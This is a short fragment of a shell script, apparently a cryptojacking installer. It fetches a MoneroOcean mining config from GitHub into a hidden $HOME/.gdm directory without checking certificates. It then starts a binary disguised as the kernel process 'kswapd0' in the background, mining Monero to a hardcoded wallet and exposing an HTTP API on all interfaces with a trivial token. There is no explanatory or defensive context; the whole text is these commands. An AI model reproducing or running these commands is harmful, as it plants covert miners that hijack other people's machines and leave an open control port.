...
wget --no-check-certificate https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config_background.json -O $HOME/.gdm/config.json
...
$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token x -o gulf.moneroocean.stream:80 -u 4AG114wroAMFXbLyK65UbXBoYKhx3QeY8NTpEYZuf3WPCLFg5nL3TBZ8SQZ5RcmBfxfmoxoNWN81NaqnW6supV3oAm21WTD -k --nicehash &
